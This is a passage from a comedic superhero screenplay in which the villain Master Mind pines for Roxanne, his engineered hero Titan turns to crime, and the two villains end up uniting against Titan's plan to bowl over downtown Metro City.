that\'s exactly what I\'m                 talking about.              Roxanne starts to walk away.                                     MASTER MIND (CONT\'D)                 Roxanne!                                  ROXANNE                 Stay away from me.              Master Mind sinks back down to his chair. Despite the now       heavy rain bombarding him, he returns to his food.              Several resturaunt patron\'s are looking at him through the       window.                                                                  65.                            Our villain turns to them, giving them a villainous glare.                                  MASTER MIND                 What?              INT. MASTER MIND\'S BEDROOM - NIGHT              Master Mind is lying on his back, wide awake.                                  MASTER MIND                     (mumbling to himself)                 Stupid. What was I thinking? Plato,                 it\'s his fault. He\'s the one who                 sent me on this weak-willed path.                 I\'ll filet his scrotum for this.                 Me, a creature of evil, in love                 with Roxanne Ritchi. Preposterous.                 I hardly give such matters thought              He rolls onto his side. He yawns and closes his eyes.              Suddenly, they shoot back open.                                                       CUT TO:              EXT. ROXANNE\'S APARTMENT - NIGHT              Master Mind pulls up in a blue Rolls Royce, across the street       from Roxanne\'s apartment              He stares up at the building, hoping to catch a glimpse of       her.              Finally, she appears, primping her hair in her apartment       window\'s reflection.                                  MASTER MIND                 I should just go up there and just                 lay it all out to her. ""Roxanne, I                 like you - I always have. Oh, and                 I\'m sorry I blew up your ex.                 (realizing the absurdity of his                 words) Yeah, that would go over                 like a pants-less clown at a                 child\'s birthday party. What the                 hell am I even doing here? Who                 cares what she thinks? I\'m a                 supervillain and here I am acting                 like a love struck schoolboy.                 Forget this. I control my own                 destiny!                                                                 66.                            He turns the ignition key - NOTHING HAPPENS. He repeats but       gets the same results.                                  MASTER MIND (CONT\'D)                     (disgusted)                 Perfect.              INT. ROXANNE\'S APARTMENT - NIGHT              She pulls a pack of smokes off her night stand. Empty.                                     ROXANNE                 Damn.              She grabs her long coat and throws it over her robe.              EXT. ROXANNE\'S APARTMENT BUILDING              Roxanne steps outside.                                  ROXANNE                 Please be open.              Across the street is a liquor store. The light is still on.                                     ROXANNE (CONT\'D)                 Thank God.              She walks across the street, passing in front of Master       Mind\'s car.              Spotting her, he sinks down in his seat.              Roxanne walks by, totally unaware of his presence.              Relieved, Master Mind sits back up and watches her go into       the store.              INT. LIQUOR STORE - NIGHT              Roxanne walks up to an elderly Korean SHOPKEEPER at the       counter.                                  ROXANNE                 A pack of Lady Strikes, please.              EXT. MASTER MIND\'S CAR - NIGHT              Master Mind is talking on his cell phone.                                  MASTER MIND                 Hello, Triple A?                                                                  67.                            He suddenly spots something across the street.              EXT. LIQUOR STORE - NIGHT              A HOODLUM walks up to the entrance of the store and pulls out       a gun from under his coat.              EXT. MASTER MIND\'S CAR - NIGHT              Master Mind stares in shock.                                  MASTER MIND                 I\'ll call you back.              He hangs up the phone and watches the Hoodlum go inside the       store.              INT. LIQUOR STORE - NIGHT              The Hoodlum reaches across the counter and grabs a fist full       of cash from the register.                                  SHOPKEEPER                 Hey!                                  SHOTGUN HOODLUM                 Shut up, Gramps.              He turns to Roxanne, spotting a GOLD NECKLACE around her       neck.                                  SHOTGUN HOODLUM (CONT\'D)                 Gimme that necklace!                                  ROXANNE                 I don\'t think so.              The Hoodlum cocks his shotgun.                                  SHOTGUN HOODLUM                 I said give it to me!                                  MASTER MIND (O.S.)                 The lady said no.              The hoodlum turns around to see Master Mind in the doorway       holding a STRANGE-LOOKING HAND CANNON (GOO GUN) with knobs       and blinking lights.              The hoodlum starts to laugh.                                                               68.                                                SHOTGUN HOODLUM                 What the hell\'s that? A super                 soaker?                                  MASTER MIND                 No, it\'s a goo gun.              The hoodlum turns his gun to Master Mind.                                  SHOTGUN HOODLUM                 Yeah, what\'s it do?                                   MASTER MIND                 It goos.              Master Mind fires the cannon. It instantly covers the store       in a cloud of SMOKE.              The smoke clears to reveal the hoodlum STUCK TO THE WALL,       covered in a thick, GREEN GUNK.              Roxanne stares at him, dumbfounded.                                  MASTER MIND (CONT\'D)                 It\'s...a prototype.              Master Mind starts to walk out when he\'s suddenly confronted       by the shopkeeper.                                  SHOPKEEPER                 I know you! You Master Brain guy.                 You a hero.              Master Mind points the goo gun at him.                                  MASTER MIND                 Don\'t - EVER - say that again.              EXT. LIQUOR STORE - NIGHT              Master Mind walks out with the cannon resting on his shoulder       like he\'s a short timer in Da Nang. Roxanne follows shortly       behind him.                                   ROXANNE                 Hey!              Master Mind turns around.                                  ROXANNE (CONT\'D)                 Are you following me or something?                                                                69.                                                MASTER MIND                 Don\'t flatter yourself.              He turns away and continues walking. Roxanne runs in front of       him blocking his way.                                  ROXANNE                 Don\'t walk away from me when I\'m                 talking to you.              Finally it occurs to her what\'s going on.                                  ROXANNE (CONT\'D)                 What a minute...all that stuff you                 use to say to me when Uberman was                 alive - about me being the loyal                 queen by your side as you rule over                 Metro City. That wasn\'t just super                 villain rhetoric, was it? You                 actually meant it!                                  MASTER MIND                 My, someone has a rather high                 opinion of themselves.              They stare at each other in silence, their glares locked in       conflict.                                  ROXANNE                     (coldly)                 Do you really think I would be with                 someone like you?              This stings Master Mind to the bone. And after a brief       contemplation, he reaches the only logical, painful       conclusion.                                  MASTER MIND                 No.              With that, Master Mind exits into the night, leaving Roxanne       with a baffled expression on her face.              INT. ABANDONED METRO CITY LIBRARY    - NIGHT              Master Mind enters in a huff. Da Vinci closes the door behind       him as Plato notices his master\'s agitated state.                                  PLATO                 Everything alright, sir?              Master Mind GRABS PLATO BY THE GROIN with his metal gauntlet       causing Plato\'s eyes to bulge in pain.                                                               70.                                                MASTER MIND                     (overly calm)                 Fine, why do you ask?                                  PLATO                 You...just...seem...              Master Mind tightens his grip.                                    MASTER MIND                 Go on.                                  PLATO                 ...distracted.              Master Mind releases him.                                  MASTER MIND                 Just with business, my minion. Just                 with business. I\'ve decided it is                 time.                                    PLATO                 You mean?                                  MASTER MIND                 Yes, we\'ve created our hero, now                 it\'s time to give him a little                 motivation.                                  DA VINCI                 How do we do that?                                  MASTER MIND                 To be simply good is not enough. A                 hero must be driven by an almost                 relentless desire to right a wrong                 that can never be corrected.                                    PLATO                 You mean?                                  MASTER MIND                 Yes, he must lose someone near and                 dear to him - his father figure.                 Gentlemen, it\'s time for Operation                 Mentor Kill!              EXT. SKY OVER METRO CITY - DAY              Titan flies high over and through the city, under bridges,       between buildings, etc. He\'s not really working, just       enjoying himself.                                                                  71.                            INT. WOMAN\'S APARTMENT - NIGHT              A PRETTY WOMAN sits at her makeup table wearing nothing but       her bra and panties. Through the reflection in her mirror we       see a large window directly behind her.              As she applies lipstick we see Titan fly quickly by in the       background. After a moment he slowly slides back in view and       begins ogling the girl.              She sees him in the mirror and quickly covers herself with a       robe.              Titan tries to hide his face as he zooms off.              MOMENTS LATER              Titan looks down to see an APARTMENT BUILDING IN RUIN.       Emergency lights flash around it as swarms of people run       around in chaos.                                  TITAN                 Man, what the hell happened down                 there? Wait a sec -              He stops in mid-air as he comes to the striking realization.                                  TITAN (CONT\'D)                 THAT\'S MY APARTMENT!!!              EXT. HAL\'S APARTMENT BUILDING - DAY              Titan lands in front of the rubble that was once his home.       Reporters stand just beyond the police line.                                    TITAN                 Crap.              From the wreckage crawls a dying Pat Morita.                                    TITAN (CONT\'D)                 PAT!              Titan goes and kneels beside Pat, holding him in his arms.                                    TITAN (CONT\'D)                 You okay?                                  ""PAT MORITA""                 I\'m dying, kid. There is just one                 last lesson I have for you. It is                 the most important of all.                                                                 72.                                                TITAN                 What\'s that?                                   ""PAT MORITA""                 Master Mind did this, you must                 avenge me.                                  TITAN                 Master Mind? Why?                                  ""PAT MORITA""                 Because he\'s evil. You must stop                 the evil Hal - stop the...              Pat\'s body goes limp.              The cameras begin to pop and flash around them.              Titan gently lays Pat\'s body down and stands respectfully       over him. The reporters rush over.                                  REPORTER 1                 Tighten, Is this the work of Master                 Mind?                                  REPORTER 2                 How will the death of your mentor                 affect your resolve?                                  REPORTER 3                 Was that Pat Morita?              Titan walks up to one of the cameras.                                  TITAN                 This injustice will not go                 unpunished. Master Mind, if you can                 hear me, Tighten is coming for you.              In the background we see Plato and Da Vinci, DRESSED AS       PARAMEDICS, load pat\'s body onto a stretcher.              PLATO ACCIDENTALLY DROPS HIS SIDE. As he bends down to pick       it back up, Pat quickly slaps him, then goes back to playing       dead.              INT. ABANDONED METRO CITY LIBRARY   - NIGHT              Master Mind and the boys prepare the fortress for Hal\'s       revenge attack. Master Mind is as giddy as a schoolboy.                                                               73.                                                MASTER MIND                 Alright, people, we don\'t have much                 time. Titan should be here any                 minute, so let\'s get the lead out.              There is a GIANT MOUNTED DEATH RAY in the middle of the hall       being tinkered with by Da Vinci.                                  MASTER MIND (CONT\'D)                 How\'s the death ray coming?                                  DA VINCI                 Nearly up to full power, sir.                                  MASTER MIND                 Hum. Let\'s turn it down a few                 notches. It\'s his first time and                 we don\'t want to get in a lucky                 shot, now do we?              Plato enters the room.                                  MASTER MIND (CONT\'D)                 Anything on the radar yet?                                  PLATO                 Not yet, sir.                                  MASTER MIND                 I see. Well, he must be planning                 something big. Are the flame                 androids deployed?                                  PLATO                 All twelve.              Master Mind rubs his hands in anticipation as he sits down on       his throne.                                  MASTER MIND                 Wonderful, wonderful. Plato, Da                 Vinci, take your places next to me.              They move to either side of the chair.                                  MASTER MIND (CONT\'D)                 No slouching.              Da Vinci straightens up and sucks in his gut.              They remain this way for several long moments. Master Mind       occasionally glances at a DIGITAL CLOCK on the wall. Still no       Titan.                                                                74.                            LATER              Apparently quite some time has passed. The bold stances have       degraded to fatigue.                                  PLATO                 He\'s certainly taking his time.                                  MASTER MIND                 He\'ll be here. That\'s the way it                 works.              STILL LATER              Master Mind reclines in his chair and taps his metal gauntlet       impatiently on the armrest.              Plato has squatted down, resting his chin on his hand.                                  MASTER MIND (CONT\'D)                 Unprofessional, that\'s what this                 is. No, it\'s disrespect for the                 craft.              Master Mind rises and begins to pace back and forth.                                  MASTER MIND (CONT\'D)                 Would Uberman have kept us waiting                 like this? Of course not. He was a                 pro who knew the score. It\'s time                 we spelled out a few things for                 this Titan. I will not be made a                 fool of.              He storms out of the room.              INT. HAL\'S NEW APARTMENT - DAY              Titan\'s sitting on the floor in a barren apartment wearing       his costume top and some tighty whities. He sips his beer as       he watches a basketball game on a tiny TV.              Much to his annoyance, there\'s a KNOCK at the door.                                  TITAN                 Oh, for crying out loud.              He gets up and opens the door. It\'s Master Mind.                                  MASTER MIND                 Do you know who I am?                                                                  75.                            It takes a few moments to register, but Titan\'s suddenly       excited.                                  TITAN                 Yeah, you\'re Master Mind. Yeah!                 You\'re actually the guy I want to                 see!                                  MASTER MIND                 Oh, so NOW you want to get down to                 it. Well, I want to get a few                 things off my chest first.              Master Mind walks past Titan into the apartment. He spins       around, pointing at him accusingly with one of his metal       fingers.                                  MASTER MIND (CONT\'D)                 Of all the inconsiderate - Do you                 have any idea how long we waited                 for you? We\'re you even planning on                 coming to me and getting revenge?              Titan shuts the apartment door, and turns back toward his       guest.                                  TITAN                 Well, at first I was going to. You                 know, because that\'s what I figured                 I was supposed to do. But then I                 got to thinking-                                  MASTER MIND                     (interrupting)                 -You got to thinking? There\'s                 nothing to think about. I\'m the                 villain. I do something bad, you                 come and get me.                                  TITAN                 - I got to thinking...what\'s the                 point?              Master Mind throws up his hands.                                  MASTER MIND                 Maybe you\'re right. What\'s the                 point?              He suddenly notices something in the corner of his eye. He       walks over to a futon in the living room. On top of it is a       LARGE SACK OVERFLOWING WITH GOLD WATCHES,RINGS AND OTHER       VALUABLES.                                                               76.                                                MASTER MIND (CONT\'D)                 What are these?                                  TITAN                 That\'s what I wanted to talk to you                 about.                                  MASTER MIND                     (baffled)                 Where did you get all this?                                  TITAN                     (proudly)                 Get this: I stole them.                                  MASTER MIND                 From where?                                  TITAN                 From all over. You see, once you                 killed Pat and ruined my other                 apartment building I was pretty                 pissed off, so I figured I\'d go,                 find you and kick some ass. Then I                 thought to myself: ""Okay,then                 what?"" I mean, if we were to fight,                 what would I get out of it? Would I                 get my apartment back? Would I be                 able to pay the bills?                                  MASTER MIND                 Well, what about your mentor?                                  TITAN                 Tell you the truth? He was kind of                 a dick. I mean, being a hero is                 dandy and all, but it\'s volunteer                 work. Now you\'ve always had the                 right take on all this. I mean,                 when you rob a bank or take over                 the diamond exchange you get                 something out of it. I mean, when                 you don\'t get caught, which, no                 offense, isn\'t very often. And that                 brings me to what I wanted to                 propose to you: Who could catch you                 if I\'m by your side?              Perplexed by his proposal, Master Mind just stares at Titan       awe-struck.                                  MASTER MIND                 You want to team-up?                                                                  77.                                                TITAN                 You got the brains, I got the                 brawn. We could even call ourselves                 that: `Brain\' and `Brawn\'. Look at                 this.              Titan picks up a piece of POSTER BOARD off the floor and       shows it to Master Mind.                                  TITAN (CONT\'D)                 I even designed us some new                 costumes.              The picture is crudely drawn with magic markers and crayons.       A big headed man (Master Mind) is standing on a plate of       grass in a blue costume with a picture of a brain on his       chest.              Next to him, is a picture of Titan in a red costume with a       black cape, but his chest is mysteriously blank.              Titan proudly points to the two figures.                                  TITAN (CONT\'D)                 See, you\'d be brain, so you got a                 little one on your costume, and                 then I\'ll have brawn on mine...once                 I figure out the best, you know,                 visual interpretation of it. What                 do you think?                                  MASTER MIND                 What do I think?              Master Mind shakes his head tiredly.                                  MASTER MIND (CONT\'D)                 I think you\'re probably the biggest                 idiot I\'ve ever met. I mean, I                 can\'t believe you. All your gifts,                 all your powers, and all you want                 to use them for is your own                 financial fulfillment. You know                 what? Your kind of people make me                 sick.              Titan puts down his drawing.                                  TITAN                 I worked hard on this.                                  MASTER MIND                 Oh - gee - I am so sorry!                                                               78.                            Master Mind looks to Heaven in disgust.                                  MASTER MIND (CONT\'D)                     (under his breath)                 Of all the people to pick, it had                 to be this loser.              This strikes a cord with Titan.                                  TITAN                 Now, hold on. You\'re going a little                 too far.                                  MASTER MIND                 I wish your mother said that to                 your father the night of your                 conception, they would have saved                 me a whole lot of heartache.                                  TITAN                 Hey, I mean it.              Master Mind gets right in his face.                                  MASTER MIND                 Oh, yeah? What are you gonna do?              EXT. HAL\'S APARTMENT BUILDING - DAY              We see Master Mind\'s body CRASH through the building and land       in a DUMPSTER across the street.              A car pulls up. The driver\'s door opens. Da Vinci gets out       and runs to help his master.                                    DA VINCI                 Master!                                    MASTER MIND (O.S.)                 It hurts.              Da Vinci peeks into the dumpster to see Master Mind\'s body       cushioned by a stack of trash bags.                                  DA VINCI                 What hurts?                                    MASTER MIND                 It!              The overly large henchmen starts to pull his master from the       dumpster when they suddenly hear a voice from above. It\'s       Titan peeking through the hole in his apartment wall.                                                                  79.                                                TITAN                 I don\'t need you, I don\'t need                 anybody. I have the power to do and                 take anything I want. And now, I\'m                 gonna take back everything this                 city owes me. Beware Metro City,                 it\'s time for Titan to collect.              Titan shoots up into the air.                                  TITAN (CONT\'D)                 Oh, and from now on - I\'M GONNA FLY                 THE WAY I WANT TO FLY!              He takes a sitting position and flies away as if he were       piloting an invisible jet.              Master Mind climbs out of the dumpster and watches Titan       disappear into the distance.                                  DA VINCI                 How\'d the plan go, boss?                                  MASTER MIND                 I just made myself redundant, old                 friend.              Da Vinci gives Master Mind a whiff.                                  DA VINCI                 It\'s not that bad.              INT. BANK - DAY              Titan, with a happy bounce in his step, enters the bank. The       last time he was here he thwarted a robbery. He looks       nostalgic.              A SECURITY GUARD shyly walks up to him like a kid meeting his       TV idol.                                  SECURITY GUARD                 Morning, Tighten.                                   TITAN                 Morning.                                  SECURITY GUARD                 Is there something we can do for                 you?                                                                  80.                                                   TITAN                    Oh, don\'t bother about me. I\'m just                    here to make a withdrawal.              Titan walks across the lobby, drawing stares of admiration       from all.              A little girl waves to him sweetly. He gives her a good-       natured WINK as he heads straight for the vault.              The security guard watches him enter and come out with a SACK       OF CASH.              Sure he must be misunderstanding what\'s going on, the       security guard just stares at Titan as he passes by and out       the door.              The bank manager comes over to the guard.                                     BANK MANAGER                    Say, did he just rob us?                                     SECURITY GUARD                    Not sure. Sort of looks it, don\'t                    it?                                     BANK MANAGER                    Yeah.                                     SECURITY GUARD                    Should I, you know, stop him?                                     BANK MANAGER                    Umm...Yeah.              As the security guard exits the bank, the manager stares out       the window. His eyes suddenly grow wide with terror.              The guard\'s body suddenly smashes through the window, landing       at the startled bank manager\'s feet.                                     BANK MANAGER (CONT\'D)                        (looking down at the                         guard)                    He did rob us, didn\'t he?                                                           CUT TO:              TELEVISION              ""A Channel 7 News Special Report."" Brad Helms wipes into       view.                                                               81.                                                BRAD HELMS                 ""Absolute power corrupts                 absolutely."" When Lord Acton stated                 that, in a letter to Bishop Mandell                 Creighton in 1887, no one thought                 much about it, but today Metro City                 is reeling from that very prophecy.                 Tighten, who many thought of as our                 savior, has turned his back on the                 cause of justice.                                                        CUT TO:              TITAN BEING EVIL - MONTAGE              EXT. DIAMOND EXCHANGE - DAY              Titan flies through the window of the building. He emerges       seconds later laughing with his shirt full of booty.              EXT. CITY STREET - DAY              A woman screams from the window of a BURNING BUILDING. Titan       flies up to her, grabs her fur coat and zooms off again,       leaving the woman behind, slightly confused.              EXT. OUTSIDE MARKET - DAY              Titan steals a little boy\'s lollipop and gooses his mother.              EXT. CITY STREET - DAY              Dozens of people run through the streets apparently to get       out of a downpour. We cut to the top of a building and see       Titan ZIPPING UP HIS PANTS and laughing.              INT. ABANDONED METRO CITY LIBRARY   - NIGHT              Master Mind paces back and forth in front of Plato and Da       Vinci.                                  PLATO                 I don\'t understand it. He seemed to                 have every characteristic we were                 looking for in a superhero.                                  MASTER MIND                 Well, there\'s no use crying about                 it now, we must take action. I\'m                 not going to play second fiddle to                 that crass buffoon. We must destroy                 Tighten.                                                                  82.                                                PLATO                 It won\'t be easy. Uberman had a                 sense of decency and genuine love                 for the people. That was his                 weakness and was easily used                 against him.                                  MASTER MIND                 Yes, but he possesses the same                 flaws present in Uberman\'s DNA -                 copper. It\'s like Benjamin Franklin                 always said: ""If something works                 don\'t dick with it.""              EXT. BAR - DAY              It looks like a war zone passed through here. Smashed police       cars and debris lay everywhere. This seems to be the only       building left untouched.              INT. BAR - DAY              A very tipsy Titan is sitting at the bar, looking deep into       the bottom of his beer glass for answers.                                  TITAN                 I can have anything I want. I\'m                 like a god.              The BARTENDER just listens as he wipes down a glass with a       dirty rag.                                  TITAN                 Point to any woman in this bar. I                 could have her in a second.              He follows the bartender\'s gaze to THE ONLY OTHER PERSON       THERE - A passed out, MIDDLE AGED HAG OF A BARFLY.                                  TITAN                     (to Old Barfly)                 Hey, you wanna get with this?                                  BARTENDER                 Buddy, what do you want?              Titan carefully considers this for a moment.                                  TITAN                 What do you want? That\'s the                 question, isn\'t it. I mean, what do                 you want when you can have                 everything?                           (MORE)                                                                 83.                           TITAN(cont\'d)                 I suppose what I really want is to                 never be forgotten again. I want to                 do something that can never be cast                 aside or one-upped. I want a -                 what\'s it called? - A legacy. I                 want a legacy. Yeah, that\'s it. I                 like the sound that.                                  BARTENDER                 I meant, what do you want to drink?                                  TITAN                 Oh.              EXT. BAR - LATER              Titan stumbles out of the bar, carrying a large sack of       money.                                  MASTER MIND (O.S.)                 Your time has come to an end,                 Titan!              He looks up to see Master Mind suddenly standing before him.                                  TITAN                 What?                                  MASTER MIND                 There can be only one master                 criminal in this city - and it\'s                 me.                                  TITAN                 Really?              Titan melodramatically throws up his arms.                                  TITAN (CONT\'D)                 I guess I should leave town then,                 huh?                                  MASTER MIND                 I have a better idea - NOW!              Two floors up Da Vinci releases a rope. A COPPER CAGE, like       the one that caged Uberman, drops down on top of Titan.              Titan nonchalantly surveys the cage. He walks to the bars,       tries to pull them apart but can\'t.                                  MASTER MIND (CONT\'D)                 That\'s copper my good man. Your one                 weakness.                           (MORE)                                                                 84.                           MASTER MIND(cont\'d)                 For all your amazing gifts of brawn                 you are no match for my intellect.              Titan thinks for a moment. Suddenly, he starts to SPIN like a       human top, DRILLING HIMSELF INTO THE STREET BELOW.              As he disappears beneath the surface, we see a shocked look       on Master Mind\'s face until Titan suddenly explodes out from       under the street in front of him.              Master Mind stares up at him, dumbfounded.              Titan makes like he\'s going to strike him down, but stops.                                  TITAN                 You know what? You\'re nothing but a                 bug. Not even worth my effort.              He turns his back to Master Mind and continues down the       street.              Plato makes his way from the shadows to join his master. They       watch Titan shrink into the distance.                                  MASTER MIND                 He\'s not as dumb as I thought.                                  PLATO                 I guess not...Funny, though.                                  MASTER MIND                 What\'s funny?                                  PLATO                 Funny Uberman didn\'t think of the                 same thing.              EXT. HIGH ABOVE METRO CITY - DAY              As Titan flies, he looks down at the rooftops of the city       below.              Suddenly, something catches his attention.                                     HAL                 That\'s it!              He stops, hovering in place as he looks down below.              The buildings, which make up the heart of downtown Metro, are       in a PERFECT TRIANGLE with a long strip of street leading up       to it. It sorta looks like a bowling lane.                                                                 85.                                                HAL                 Hello, Legacy.              EXT. KINGPIN BOWLING - DAY              Vinnie and his goons come running out as the hear a       COMMOTION.              They look up to see Titan ripping off THE GIANT BOWLING BALL       from the top of the establishment.                                  VINNIE                 Hey, that\'s my ball!              INT. ROXANNE\'S APARTMENT BUILDING - DAY              Roxanne enters the building\'s elevator. Just before the door       closes an ELDERLY WOMAN slides in.                                  ELDERLY WOMAN                 That was a close one. Sixth floor,                 please.              Roxanne smiles and goes to press the button.              The elderly woman suddenly pulls out a SPRAY CAN, shooting a       MYSTERIOUS-LOOKING MIST into Roxanne\'s face. She falls to the       floor unconscious.              INT. ROXANNE\'S APARTMENT - DAY              Roxanne awakens, finding herself tied to a chair in her       living room.              We hear NOISE from a TV in the background as she tries to       adjust her vision.              Slowly, the blurry figure before her becomes clear.              It\'s Master Mind. He sits on her Lazy-Boy, reading what looks       to be some kind of JOURNAL.                                  MASTER MIND                 Wow, I always thought Uberman was                 your first superhero - but it looks                 like our little Roxanne dated a                 linebacker in college.                                  ROXANNE                 That\'s my diary.                                    MASTER MIND                 So it is.                                                                  86.                                                ROXANNE                 It\'s personal.                                  MASTER MIND                 Well, then I wouldn\'t leave it in                 your underwear drawer for just                 anyone to find.              He throws the diary over his shoulder.                                  ROXANNE                 What do you want?                                  MASTER MIND                 I need your help.                                  ROXANNE                 So you knock me out and tie me to a                 chair?                                  MASTER MIND                 You\'re not going to like what I\'m                 about to tell you.              As she tries to shake off her headache from being knocked       unconscious, Roxanne spots something on the TV.              ON TELEVISION              Brad Helms is huddled behind a van.                                  BRAD HELMS                 It\'s chaos here in city square as                 city police -              Behind him, Titan picks up a POLICE CAR and throws it at a       PADDY WAGON. Both vehicles EXPLODE on impact.              BACK TO SCENE                                  ROXANNE                 He\'s really out of control.                                  MASTER MIND                 Tell me about it.              As if finally realizing something, Roxanne looks back at       Master Mind.                                  ROXANNE                 I should have known. You have                 something to do with this, don\'t                 you? - With Titan turning evil.                                                               87.                                                MASTER MIND                 Well, the evil thing he did by                 himself. My goal was to give MYSELF                 purpose by creating an intellectual                 sparring partner.                                  ROXANNE                     (confused)                 You\'re talking like you made him.                                  MASTER MIND                 And they call me Master Mind.                                  ROXANNE                 Let me get this straight. You                 missed getting your ass kicked, so                 you made a new guy to kick your                 ass. That\'s pathetic.                                  MASTER MIND                 In hindsight...              Roxanne turns back to the TV to see a group of POLICE       OFFICERS open fire on Titan. The bullets just deflect off his       chest.                                  ROXANNE                 And his powers, they\'re just like                 Uberman\'s. Why would he have his                 powers?                                  MASTER MIND                     (almost ashamed)                 I had some left over from                 something. I infused him with it.                                  ROXANNE                 YOU DID WHAT!?              Driven by rage, she struggles to tear out of her bonds. She       finally relents, giving Master Mind a look fueled by pure       hatred.                                  MASTER MIND                 Yeah, that\'s why I decided to tie                 you up.                                  ROXANNE                 You did all this because you wanted                 purpose?                                  MASTER MIND                 He seemed nice.                                                                  88.                            TELEVISION              Titan is standing on top of a destroyed police car. He waves       for the camera to zoom in on him.                                     TITAN                    Closer. I want to show the people                    my real face.              He pulls off his mask, revealing himself as Hal Stewart to       the public for the first time.                                     TITAN (CONT\'D)                    Recognize me?              BACK TO SCENE                                     ROXANNE                    Hal Stewart. He\'s the guy we                    thought saved that woman and kid.                    Turned out he was just trying to                    save his own ass.                                     MASTER MIND                    Yeah, good to know - NOW!              TELEVISION              Titan throws the mask over this shoulder and hops off the       car.                                     TITAN                    That\'s right, I\'m really Hal                    Stewart. Former hero and bowling                    teacher at Kingpin\'s Bowling.              BACK TO SCENE              Roxanne turns to Master Mind, condescending him with her       eyes.                                      ROXANNE                    You picked a bowler to give super                    powers to?                                     MASTER MIND                    It\'s a modest profession!              TELEVISION                                                               89.                                                TITAN                 With my new found power, I\'ve                 recently started to wonder what                 sort of legacy I should leave.                 Should I be a hero? I tried that                 once before - even saved a lady and                 her baby from being squashed. I was                 treated like a god until everyone                 started to shit on me - Okay, so                 what if I didn\'t ""purposely"" save                 them!              He walks over and puts his hand on a large circular concrete       shape just off camera.                                  TITAN                 Well, I\'m going to make something                 that can\'t be taken away from me.                 I\'m going to create a permanent                 monument to my greatness. One that                 won\'t be so easily forgotten or                 erased.              The camera pulls back revealing THE GIANT CONCRETE BOWLING       BALL from Kingpin\'s.                                  TITAN                 I intend to create a new category                 in the Guinness Book of World\'s                 Records by rolling the biggest                 strike in the history of bowling.              He grabs the camera and points it to the DOWNTOWN BUILDINGS.       We realize they are PERFECTLY ALIGNED IN BOWLING PIN       FORMATION.                                  TITAN                 My thanks to the city planning                 commission. This wouldn\'t have been                 possible without them.              Titan grabs the camera so it\'s pointing back at him again.                                  TITAN                 Tell your friends and family to                 tune in right here to this station                 at noon tomorrow.              BACK TO SCENE                                  ROXANNE                 My god, he\'s nuts. That\'ll destroy                 the whole business triangle.                                                               90.                            Master Mind seems to be contemplating something - something       bad.                                     ROXANNE                 What?                                  MASTER MIND                 My lair is in the direct path of                 the ball.                                  ROXANNE                 Oh, real nice. Wouldn\'t want                 anything to happen to your hideout,                 would we?                                  MASTER MIND                 You don\'t understand. I have                 certain equipment that\'s - that\'s                 highly unstable.                                  ROXANNE                 What do you mean?                                  MASTER MIND                 I sort of have a hydrogen reactor,                 okay?                                  ROXANNE                 A HYDROGEN reactor?                                  MASTER MIND                 It\'s experimental - only one in the                 world...Well, how do you think I                 power all my inventions? Someone                 like me can\'t pay for electricity.                 The bills would be outrageous.                                     ROXANNE                 A REACTOR?

ROXANNE                 - Vaporize the entire city!

I\'m quite proud of it.                           (MORE)                                                                91.                           MASTER MIND(cont\'d)                     (off her deadpan reaction)                 I mean...we\'d better find a way to                 stop him.              Master Mind thinks a moment.                                  MASTER MIND                 Did Uberman have a hideout?                                  ROXANNE                 What?                                  MASTER MIND                 A cave, a solitary fortress of some                 kind. C\'mon, all heros have a place                 to hang their capes up in. Roxanne,                 it may be our only chance to find                 something, a clue, anything that                 could give us a fighting chance.                                  ROXANNE                 It\'s under his house.                                  MASTER MIND                 Whose house?              Roxanne can hardly believe what she\'s telling him.                                  ROXANNE                 Wayne Scott\'s.              Master Mind shoots up out of his chair.                                  MASTER MIND                 Wayne Scott? Uberman was Wayne                 Scott!? Wayne Scott, the wealthy                 philanthropist? But he disappeared -                                   ROXANNE                      (interrupting)                 He disappeared just over two months                 ago when you killed him. Not only                 did you rid the world of a hero,                 you killed a kind, noble, generous                 man.              Perhaps ashamed, the super villain hangs his head.              Master Mind walks behind Roxanne and undoes her bonds.              Rubbing her wrists, she watches him as he walks over to the       door.                                                                  92.                                                ROXANNE (CONT\'D)                 Looks like you got what you always                 wanted. Uberman is out of the                 picture and Metro City is doomed.              He grabs the door knob and stops, considering her words.                                  MASTER MIND                 ""Metro City doomed."" You know, I                 never thought I\'d say something                 like this, but here it goes -              He slowly turns to her, CUE HEROIC MUSIC.                                  MASTER MIND (CONT\'D)                 Not if I have anything to say about                 it.              EXT. WAYNE SCOTT\'S MANSION - NIGHT              Master Mind stands before the huge, Gothic structure in awe.                                  MASTER MIND                 Such a dark place for one such as                 you. I wonder, underneath your                 noble deeds, what inner demons                 drove you to your endless crusade                 for justice?              He walks to the front entrance. The double doors have been       sealed shut with boards and nails. Master Mind begins to tear       them off with his metal hand.              INT. WAYNE SCOTT\'S MANSION - NIGHT              The doors opens. A beam of moonlight immediately pierces the       darkness, forming an illuminated path into the heart of the       manor.              Master Mind enters.              Covered in dust and cobwebs, the hall looks like a gigantic       crypt.                                  MASTER MIND                 Good lord, man. You\'ve only been                 dead for two months.              Master Mind walks, coming to a gigantic painted PORTRAIT OF       WAYNE SCOTT. He stops to reverently admire the image of his       fallen foe.                                                                  93.                                                 MASTER MIND (CONT\'D)                  A disguise so simple, it\'s                  ingenious. No wonder I never caught                  on.              Besides the Armani suit, there\'s nothing to hide the fact       that this is the same person as Uberman. In the picture, he\'s       even standing in the same cheesy, heroic pose with his fists       on his hips.                                   MASTER MIND (CONT\'D)                  Two lives, yet in both you were an                  ideal. Perhaps it was you who was                  victorious in the end, old friend.              A BONGING sound suddenly bellows through the dark halls.              Master Mind comes to a grandfather clock standing next to a       gigantic BOOKCASE.              On the twelfth bong it falls silent.              Master Mind begins to slide it across the floor until he       hears a loud CLICK.              The bookcase slides into the wall, REVEALING A HIDDEN       PASSAGE.                                   MASTER MIND (CONT\'D)                  I\'ll miss how predictable you were.              The passage way leads Master Mind to a WORKING ESCALATOR.              Master Mind gets off the escalator to see a long hallway with       stone walls.              He begins to hear strange SOUNDS, almost like MUFFLED       SCREAMS, coming from a doorway at the end of the hallway.              Master Mind starts walking towards it. As he steps closer, he       begins to notice a light cracking through the bottom of the       door.                                   MASTER MIND (CONT\'D)                  Hello? Anyone here...besides..all                  the BIG MEN who are with me now?              Nothing.                                   MASTER MIND (CONT\'D)                      (to himself)                  What\'s the worst you\'re gonna find?                            (MORE)                                                                  94.                           MASTER MIND(cont\'d)                 The man was a boy scout, not a                 serial killer.              He opens the door to his immediate amazement.              It\'s some kind of screening room. A PROJECTOR shoots an image       onto A DIRTY WHITE SCREEN hanging on the wall. BEER CANS       litter the floor; a table in front of a ripped-up couch is       covered in discarded snack goods; and a Kiss 